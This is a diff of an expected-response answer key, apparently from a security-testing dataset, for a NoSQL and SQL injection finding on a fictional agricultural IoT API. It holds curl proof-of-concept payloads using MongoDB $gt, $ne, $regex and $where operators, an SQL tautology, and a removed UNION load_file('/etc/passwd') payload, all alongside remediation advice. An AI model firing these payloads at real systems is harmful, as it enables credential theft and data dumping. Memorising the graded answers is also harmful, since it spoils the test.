@@ -1,63 +1,68 @@
 # Expected Response
 
 ## System
-- Domain: Agriculture / Precision Farming
-- System: HarvestIQ IoT Platform
+- System: HarvestIQ IoT Platform v4.7.0
+- Domain: AGRICULTURE / PRECISION FARMING
 - Example ID: INJ-0122
-- Vulnerability: NoSQL Injection
+- Risk ID: RISK-INJ-122
 
-## Priority Findings
+## Findings
 
-### Finding 1: NoSQL Injection on `/api/v1/users`
-**Severity:** Critical
-**Category:** Injection (from data/knowledge/injections)
+### 1. NoSQL Injection (MongoDB Operator Injection) on `/api/v3/products?username=` — Primary (Declared Vulnerability)
 
-**Summary:**
-The `/api/v1/users` endpoint accepts a `search` query parameter that is directly
-interpolated into a raw database query without sanitization. This enables NoSQL Injection (NoSQLi),
-allowing an attacker to bypass authentication, extract all records, or execute arbitrary operations.
+The `username` parameter on `GET /api/v3/products` is JSON-parsed and passed directly to MongoDB `find()` without operator sanitization. An attacker can inject MongoDB query operators (`$gt`, `$ne`, `$where`, `$regex`) to bypass authentication filters and enumerate all agricultural IoT product/sensor records.
 
 **Evidence from HAR:**
-- Endpoint: `GET /api/v1/users?search={ "$gt": "" }`
-- Response: HTTP 200 with **all records returned** including password hashes and admin accounts
-- The query constructed: `SELECT * FROM users WHERE search = '{ "$gt": "" }'`
-  evaluates to true for all rows when the payload is `{ "$gt": "" }`
+- Endpoint: `GET /api/v3/products?username={ "$gt": "" }`
+- Response: HTTP 200 with all product records including admin `password_hash`
+- `$gt: ""` operator matches all documents where username is greater than empty string — returns all records
+- HAR response shows SQL-structured records (legacy SQL path also triggered — see Finding 2)
 
-**Root Cause:**
-- Raw string concatenation used to build database query
-- No parameterized query / prepared statement
-- Application DB account has excessive privileges (`db_owner`)
-
-## Steps to Reproduce
-
-### Step 1 — Normal request (baseline)
+**Step 1 — Baseline:**
 ```bash
-curl -s "https://api.harvestiq-iot-p.example.com/api/v1/users?search=normalvalue" \
+curl -s "https://api.harvestiq-iot-p.example.com/api/v3/products?username=normalvalue" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-Expected: Returns matching records only.
+**Expected:** Returns matching IoT product records only.
 
-### Step 2 — Inject NoSQLi payload
+**Step 2 — MongoDB `$gt` operator injection: dump all products (primary HAR attack):**
 ```bash
-curl -s "https://api.harvestiq-iot-p.example.com/api/v1/users?search={%20"$gt":%20""%20}" \
+curl -s "https://api.harvestiq-iot-p.example.com/api/v3/products?username=%7B%22%24gt%22%3A%22%22%7D" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Vulnerable outcome:** All rows returned, including admin password hashes.
-**Secure outcome:** 400 Bad Request / 0 results / sanitized error message.
+**Vulnerable outcome:** All product/sensor records returned including admin credentials — NoSQLi confirmed.
 
-### Step 3 — Privilege escalation (if DB over-privileged)
+**Step 3 — MongoDB `$ne` operator: extract all non-null records:**
 ```bash
-# SQLi variant: attempt to read OS-level files (if DB runs as LocalSystem)
-curl -s "https://api.example.com/api/v1/users?search=' UNION SELECT null,null,load_file('/etc/passwd')--" \
+curl -s "https://api.harvestiq-iot-p.example.com/api/v3/products?username=%7B%22%24ne%22%3Anull%7D" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
+**Vulnerable outcome:** All records where username is not null — full collection dump.
 
-### Step 4 — Verbose error confirmation
+**Step 4 — MongoDB `$regex` operator: enumerate admin accounts:**
 ```bash
-curl -s "https://api.example.com/api/v1/users?search='" \
+curl -s "https://api.harvestiq-iot-p.example.com/api/v3/products?username=%7B%22%24regex%22%3A%22%5Eadmin%22%7D" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Expected verbose error (if misconfigured):** SQL syntax error message leaking table name, column names, or DB version.
+**Vulnerable outcome:** All documents with username starting with "admin" — privileged account enumeration.
+
+**Step 5 — MongoDB `$where` JavaScript injection (server-side JS execution):**
+```bash
+curl -s "https://api.harvestiq-iot-p.example.com/api/v3/products?username=%7B%22%24where%22%3A%22this.role%3D%3D'ADMIN'%22%7D" \
+  -H "Authorization: Bearer <VALID_TOKEN>"
+```
+**Vulnerable outcome:** Admin account documents returned via server-side JavaScript evaluation — all admin crop/sensor management accounts exposed.
+
+### 2. SQL Injection on `/api/v3/products?username=` — Secondary (Legacy SQL Path, RISK-INJ-122)
+
+HAR response shows SQL-structured records — legacy SQL path active on same endpoint.
+
+**Step 6 — SQL tautology (legacy SQL path):**
+```bash
+curl -s "https://api.harvestiq-iot-p.example.com/api/v3/products?username=%27%20OR%201%3D1%20--" \
+  -H "Authorization: Bearer <VALID_TOKEN>"
+```
+**Vulnerable outcome:** All product records returned via SQL tautology.
 
 ## Secure Outcome
 ```json
@@ -65,8 +70,8 @@ curl -s "https://api.example.com/api/v1/users?search='" \
 ```
 
 ## Remediation
-1. **Use parameterized queries / prepared statements everywhere:** Replace string concatenation with `?` or named parameters.
-2. **Restrict DB account privileges:** Application account should only have SELECT/INSERT/UPDATE/DELETE on required tables.
-3. **Disable verbose error messages in production:** Return generic 500/400 errors without DB details.
-4. **Deploy input validation middleware:** Reject inputs containing SQL metacharacters (`'`, `"`, `;`, `--`, `/*`).
-5. **ORM audit:** Review all `raw()` or native query calls in ORM usage; apply parameterization.
+- Strip MongoDB operator keys from query parameters before passing to `find()` — reject keys starting with `$` (RISK-INJ-122).
+- Use MongoDB schema validation to reject unexpected operator patterns.
+- Avoid `JSON.parse()` on raw query parameters — use typed schema validation (e.g., Joi, Zod).
+- Replace legacy SQL path with parameterized queries.
+- Disable verbose error messages in production.
